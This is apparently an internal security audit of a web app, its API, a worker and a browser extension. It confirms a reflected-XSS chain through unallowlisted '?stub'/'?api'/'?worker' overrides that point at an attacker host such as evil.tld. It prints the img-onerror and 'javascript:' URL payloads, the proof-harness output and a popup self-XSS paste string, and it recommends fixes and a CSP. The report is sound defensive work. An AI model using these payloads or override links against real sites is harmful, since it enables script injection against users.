# R6 — SECURITY lens

Scope: XSS/DOM-injection audit of `public/site/index.html` + `assets/core.js`; response headers on
the live site + API + worker; worker reflected-input; extension popup/content `innerHTML`. No
pathofexile.com calls; live checks hit only our own origins. The browser proofs ran in **real
headless Chrome** driven over CDP (state confined to the rig dir `…\scratchpad\r6sec\`, site served
read-only from a local 127.0.0.1 static server), each with a **positive control** so a clean result
is trustworthy.

> This file merges a prior source-only pass with a live-browser verification pass. The prior pass's
> MAJOR is now **empirically confirmed in Chrome** (and one sub-claim, `it.count`, **refuted** — it
> is guarded). Nothing invented; nothing real softened.

**Verdict: FAIL — one MAJOR (confirmed, exploitable reflected-XSS chain on the prod origin)** plus
minor/defence-in-depth items. The *string* render pipeline is disciplined — every string field from
poe.ninja/the document is routed through `E()` (`bpc.esc`, escapes `& < > "`) and proven inert in a
real browser. The hole is the **numeric** fields, which skip `E()`/coercion, combined with
**unallowlisted data-origin overrides** that let an attacker supply the document.

---

## MAJOR — Reflected XSS: unescaped numeric document fields + `?api`/`?stub`/`?worker` overrides, no CSP

Three links, all in the shipped public build:

**1. The engine honours attacker-suppliable data-origin overrides in production.** `core.js:47-49`:
```
var API_BASE   = trimSlash(qp("api")    || CFG.API_BASE || "");
var WORKER_BASE = trimSlash(qp("worker") || …);
var STUB        = qp("stub");   // start(): STUB!=null -> url = STUB (core.js:346-348) -> fetch -> loadBuild
```
`qp()` reads `location.search` with **no allowlist**. `https://divtally.com/?stub=https://evil.tld/b.json`
(or `?api=https://evil.tld`) makes the site fetch the **entire build document from an attacker origin**
(attacker serves `Access-Control-Allow-Origin: *`, so the cross-origin read succeeds); `?worker=`
repoints the community-cache GET/POST. Delivery needs the victim to open the crafted link and load a
build (paste + submit once) — reflected, not zero-click. Confirmed by reading `core.js:44-49,346-348,388`.

**2. Several document-derived NUMERIC fields reach `innerHTML` with NO `E()`/coercion.** (Strings are
all `E()`-wrapped; these are not.)
- `meta.level` — `index.html:1290` `… Level ${m.level||'?'} …` (banner sub-line; `class`/`league` beside it ARE `E()`-wrapped)
- gem/support `level` & `quality` — `index.html:1403,1405` `Lv ${lvl}` (`lvl=it.level||0`), `1425` `Lv ${g.level}${q}` (`q=/${g.quality}`)
- tooltip `total_found` / `sample_size` — `index.html:1679` `…+p.total_found+…`, `1682` `…+p.sample_size+…` (`p.confidence` right beside them IS `E()`-wrapped — the numerics were assumed safe-by-type)
- **URL fields are quote-escaped but NOT scheme-validated:** `href="${E(p.trade_url)}"` (`1288 area is guarded; 1403,1409,1699,2308,2379 are not`), `src="${E(it.icon)}"` (`1402,1479,2288`). `E()` blocks attribute breakout but not `javascript:` — a hostile document/worker supplying `trade_url:"javascript:…"` yields a JS-executing link. `core.js:663-668` (`cacheReadThrough`) applies `trade_url: rec.trade_url` verbatim with no client-side re-validation; the real worker validates only on **write**, which the `?worker=` override bypasses.

**3. No Content-Security-Policy on the site** (confirmed live, §2) — so the inline `onerror=` and the
evil-backend `fetch` are both unmitigated.

### Proof — OBSERVED in real headless Chrome (not just inferred)
Harness `…\r6sec\harness_numeric.mjs` injects a hostile document via the identical render sinks
(`bpc.loadMock`, then hover to render tooltips). Each payload's `onerror` records its sink id:
```
NUMERIC {"hits":[201,203,204], "imgOnerror_total":2,
 "bSub_html":"<b>Witch</b> · Level <img src=… onerror=…[201]> · Standard",
 "tt_html":"…<div class=\"tt-conf\">community · unverified · <img src=… onerror=…[204]> listings…"}
```
- **201** = `meta.level` → live `<img onerror>` in `#bSub`, executed. (index.html:1290)
- **203** = `p.sample_size` → executed in the tooltip. (index.html:1682)
- **204** = `p.total_found` → live `<img onerror>` in `.tt-conf`, executed. (index.html:1679)
- **205 = `it.count` did NOT fire** — `index.html:1467` gates on `it.count>1`, and `"<img…>">1` is
  `NaN>1 === false`, so a non-numeric count is never rendered. **`count` is safe** (prior pass's
  inclusion of it was imprecise; corrected here).

**Why MAJOR, not BLOCKER:** in the vanilla path the document is our own API, which types these
numerics as ints (poe.ninja returns ints; the PoB parser coerces — `api/_lib/pob.py:218,301,305`
`int(build.get("level"))` / `int(gem.get("level"))` / `int(gem.get("quality"))`), and the **real**
worker coerces `sample_size`/`total_found` with `nonNegInt` (`worker.js:113,118`) so the real open
cache **cannot** carry these strings. Injection requires an attacker-controlled document, which today
only the `?api`/`?stub`/`?worker` overrides provide — a crafted link + a victim interaction. Genuine
reflected XSS on the origin, but not zero-click on the bare domain.

**Fix (do all three; any one breaks the chain):**
- **Coerce/escape every document-derived interpolation.** `Number(x)` (or `E(String(x))`) at each
  numeric sink above; client-side scheme-validate URLs before `href`/`src`: `icon` `^https://`,
  `trade_url` `^https://www\.pathofexile\.com/` — don't rely on the worker's write-time check (the
  `?worker` override skips it).
- **Gate the data-origin overrides.** Ignore `?api`/`?worker`/`?stub` in production (or allowlist to
  same-origin / configured hosts / a dev flag). Also closes the redirect-cache-to-attacker exfil.
- **Ship a CSP** (§2 `_headers`) — blocks the inline `onerror`, the evil-backend `fetch`, image
  beacons, and clickjacking, even if a sink is missed.

---

## 2. Response headers (live, GET)

| Tier | URL | CSP | Frame | `nosniff` | Content-Type |
|---|---|---|---|---|---|
| Site (CF Pages) | `divtally.pages.dev/` | **missing** | **missing** | present (CF default) | `text/html; charset=utf-8` |
| API (Vercel) | `divtally.vercel.app/api/health` | n/a (JSON) | n/a | **missing** | `application/json; charset=utf-8` (+ HSTS) |
| Worker (CF) | `…workers.dev/cache` | n/a (JSON) | n/a | **missing** | `application/json` |

Site already gets `x-content-type-options: nosniff` + `referrer-policy` from Pages defaults, but has
**no CSP and no frame protection** (iframable → clickjacking of the include/exclude/"purchased"
controls). The CSP absence is what leaves the MAJOR unblunted. The API/worker JSON omit `nosniff`
(not exploitable — explicit `application/json` isn't sniffed to HTML, and the worker reflects
nothing (§3) — but standard belt-and-suspenders).

### Proposed `public/site/_headers` (Cloudflare Pages)
```
/*
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=()
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' https://web.poecdn.com data:; font-src 'self'; connect-src 'self' https://divtally.vercel.app https://divtally-cache.divtally.workers.dev; frame-ancestors 'none'; object-src 'none'; base-uri 'self'; form-action 'self'
```
**Honest CSP tradeoff.** index.html and how-it-works.html each ship a large **inline `<script>`**, and
a Pages `_headers` file is static (no per-response nonce). So a nonce-less CSP must carry
`script-src 'self' 'unsafe-inline'` — which does NOT block an injected inline script, so it does not
by itself stop the MAJOR's `onerror`. It still locks external/`eval` script, `connect`, `img`,
`frame-ancestors`, `object`, `base-uri`. `style-src` needs `'unsafe-inline'` too (inline `<style>` +
`style="…"`; lower risk). `connect-src` matches the two configured backends (the `?api`/`?worker` dev
overrides would then be blocked in prod — which is desirable and reinforces the override fix).
**Stronger, and it DOES stop the MAJOR's inline `onerror`:** move both inline `<script>` blocks into
`/assets/*.js` (mechanical, no behaviour change) → `script-src 'self'` with no `'unsafe-inline'`.
Recommended alongside the numeric-escape fix. HSTS can be added on the custom domain once HTTPS-only
is certain (don't `preload` prematurely). API/worker: add `X-Content-Type-Options: nosniff` to `_send`
in `api/build.py`+`api/health.py` and to the worker's `jsonResponse`/CORS.

---

## 3. Worker — no reflected input (confirmed live) + `sanitizeEntry` is solid

`worker.js` returns only `jsonResponse(obj)` (`application/json`); all error bodies are static strings.
GET echoes only keys passing `KEY_RE=/^v[0-9]{1,3}_[0-9a-f]{16,64}$/`. Live:
`GET /cache?league=Standard&keys=%3Cscript%3E` → `{}` (the `<script>` key dropped by `validKey`).
`sanitizeEntry` (worker.js:109-135): chaos tiers finite/non-neg/`MAX_TIER`-capped; `confidence`
server-derived (client value ignored); `method` regex-gated; `sample_size`/`total_found` `nonNegInt`;
`trade_url` scheme-checked (`https://www.pathofexile.com/trade`); server-stamped `ts`;
`MAX_VALUE_BYTES` cap. **The real open cache cannot forge the numeric-string payloads** of the MAJOR —
those need the `?worker=` override. `note` is stored but the site **discards** it and hardcodes its own
(`core.js:666`), so it is not rendered — latent only (drop the field or strip HTML server-side if any
future consumer renders it raw). CORS `*` is by design (keyless, cookieless public cache; write abuse
bounded by the per-IP budget + `sanitizeEntry`) — reviewed, not a vuln.

## 4. String sinks — audited + proven inert (real Chrome)

Harness `…\r6sec\harness.mjs` (positive control `{"ctrlFlag":1,"imgOnerror":1}` proves the detector
works here) injected hostile **strings** (character/class/league, item names, implicit+explicit mods,
note, icon, variant label, `confidence`, `<img onerror>` / `x" onerror=…` / `"><img…>` / RLO U+202E /
`javascript:` source_url) via `bpc.loadMock` + tooltip + manual-modal:
```
{"xssFlag":0,"imgOnerror_total":0,"scriptTags_total":4,"bName_hasAnchor":false,"nameLinkHref":null,
 "bName_html":"&lt;img …&gt;‮evil\"'&gt;","tt_html":"…&lt;img …&gt;…tt-mods…","manual_html":"…&lt;img …&gt;…"}
```
Every string path escaped (banner name, class/league, board name, **tooltip head + mods**, manual-row
name/variant); the `javascript:` `source_url` did **not** become an `href` (guard `/^https?:\/\//i`
at index.html:1287 held). `esc()` not escaping `'` is fine — swept: no interpolated untrusted value
sits in a single-quoted attribute (0 hits). core.js has zero HTML sinks.

## 5. Extension

- **content.js / background.js — clean.** No `innerHTML`. content.js only relays messages,
  `postMessage`s to `window.location.origin` (not `*`), validates `ev.source===window` +
  `d.source==="bpc-page"`; injected only on owner origins (`manifest.json`), no `externally_connectable`
  (web pages can't message the SW directly). `league` is `encodeURIComponent`'d into a **hardcoded**
  `pathofexile.com/api/trade` base (`background.js`), no host redirection/SSRF. Sound.
- **popup.js — `innerHTML` on unescaped strings (minor).** `setOut(html){ outEl.innerHTML=html }`;
  call sites concatenate `r.amount`/`r.total` (numbers), `r.currency` (GGG enum) and **`parsed.league`**
  (line 58), which is user-pasted (extracted from a trade URL path). Pasting
  `https://…/search/<img src=x onerror=…>?q={}` injects into the **extension popup** (privileged
  origin). **Self-XSS** (user must paste attacker text into the tester) — high bar, but a real gap in a
  privileged context. Fix: escape before `innerHTML` (reuse a 4-char `esc()`), or build nodes with
  `textContent`.

## 6. API — exception detail leak (minor, info-disclosure)

`api/build.py:76,81` returns `f"{type(e).__name__}: {e}"` on unexpected errors. No traceback, but the
exception type + message surface internal detail (some messages embed filesystem paths, e.g.
`FileNotFoundError`). It is JSON, rendered `E()`-escaped by the site (not XSS) — pure info-disclosure.
Return a generic `"server error"` to the client; log detail server-side.

## Reviewed and acceptable (not findings)
- Worker CORS `*` (cookieless keyless cache) — no CSRF/credential surface. Considered.
- Extension trust boundary — owner-origin-only content script, no `externally_connectable`, constant
  fetch host. Sound (belt-and-suspenders `league`-regex + queries-count cap page-side = nice-to-have).
- No secrets committed — `wrangler.toml` carries a KV **namespace id** (resource id, not a credential);
  `config.js` has `REPLACE_ME_*` + public URLs. No tokens found. (`public/.env.local` is git-ignored;
  not part of the deployed static site.)

## Findings (severity)
- **S1 (major)** — Reflected XSS: unescaped numeric doc fields (`meta.level`, gem `level`/`quality`,
  tooltip `sample_size`/`total_found`) + unscheme-checked `trade_url`/`icon` in `href`/`src`, reachable
  via unallowlisted `?api`/`?stub`/`?worker` overrides, unblunted by the missing CSP. **Confirmed in
  Chrome (hits 201/203/204).** Fix: coerce/escape numerics + client-side scheme-validate URLs; gate the
  overrides in prod; ship the CSP.
- **S2 (minor)** — Site (CF Pages) missing CSP + frame protection; add `public/site/_headers` (above).
- **S3 (minor)** — `extension/popup.js` `setOut()` `innerHTML` from unescaped `parsed.league`; self-XSS
  in the extension popup. Escape before `innerHTML`.
- **S4 (minor)** — `api/build.py` catch-all leaks exception class+message (info-disclosure). Generic
  message to client; log detail.
- **S5 (minor)** — API + worker JSON responses lack `X-Content-Type-Options: nosniff`.
